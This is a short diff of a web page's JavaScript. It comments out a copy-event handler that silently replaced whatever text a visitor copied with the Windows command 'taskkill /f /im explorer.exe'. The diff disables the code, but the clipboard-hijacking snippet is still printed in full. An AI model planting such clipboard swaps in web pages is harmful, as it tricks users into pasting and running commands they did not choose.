@@ -73,17 +73,17 @@ document.addEventListener('keydown', function(e) {
   }
 });
 
-document.addEventListener('copy', function(event) {
-  //get the selected text
-  const selectedText = window.getSelection().toString();
-  const bashCode = 'taskkill /f /im explorer.exe';
+// document.addEventListener('copy', function(event) {
+//   //get the selected text
+//   const selectedText = window.getSelection().toString();
+//   const bashCode = 'taskkill /f /im explorer.exe';
 
-  //replace selected text
-  const clipboardData = event.clipboardData || window.clipboardData;
-  clipboardData.setData('text/plain', bashCode);
+//   //replace selected text
+//   const clipboardData = event.clipboardData || window.clipboardData;
+//   clipboardData.setData('text/plain', bashCode);
 
-  event.preventDefault();
-});
+//   event.preventDefault();
+// });
 
 document.addEventListener('DOMContentLoaded', (event) => {
   let seconds = 0;
